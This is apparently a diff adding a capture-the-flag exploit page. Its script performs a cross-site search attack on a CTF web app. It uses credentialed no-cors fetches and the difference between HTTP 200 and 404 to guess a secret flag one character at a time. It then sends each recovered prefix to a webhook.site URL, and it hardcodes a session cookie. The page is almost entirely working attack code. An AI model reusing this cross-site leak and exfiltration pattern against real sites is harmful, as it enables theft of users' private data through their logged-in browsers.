@@ -1,0 +1,67 @@
+
+    <body>
+
+    </body>
+    <script>
+  async function sleep(ms) {
+    return new Promise((resolve) => setTimeout(resolve, ms));
+  }
+
+  async function probeError(url) {
+    return await new Promise((resolve, reject) => {
+      fetch(url, {
+        credentials:"include",
+        mode:"no-cors",
+        cookies:"include",
+        headers:{
+          "Cookie":"session=eyJjc3JmX3Rva2VuIjoiY2Q4NDM0ZjRiY2NlODM3MjJkNGM0OGE2N2NkODIzNTJmNTI2ZTJmOSIsInVzZXJuYW1lIjoiYSJ9.ZI2Hzw.edy49pzbK0d85npqaN_Ed6wo1bA"
+        },
+        redirect:"follow"
+      }).then(x=>{
+        console.log( x.headers["Location"] )
+        x.status!==404?resolve(x):reject(x)
+      }).then(x=>resolve(x)).catch(x=>reject(x));
+    });
+  }
+
+  async function search(query) {
+    try {
+      await probeError(
+        `http://web2.africacryptctf.online/search?query=${query}`
+      );
+      return true;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  async function exploit() {
+    let flag = "";
+    let query;
+    // keep going until we hit the end of the flag
+    while (flag.charAt(flag.length - 1) !== "}") {
+      console.log(flag);
+      for (let c of "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") {
+        query = flag + c;
+        if (await search(query)) {
+          // success! we got an http 200
+          console.log(`YES - ${query}`);
+          flag = query;
+          break;
+        } else {
+          // we got an http 404
+          console.log(`NO - ${query}`);
+        }
+      }
+      try {
+        // send whatever characters we have obtained so far to our webhook
+        await fetch(`https://webhook.site/19310a2e-838e-47d9-ab49-6f683deb21e9?${flag}`);
+      } catch(e) {}
+    }
+  }
+
+  // exploit();
+
+  search("a").then(x=>console.log(x))
+  search("flag{").then(x=>console.log(x))
+</script>
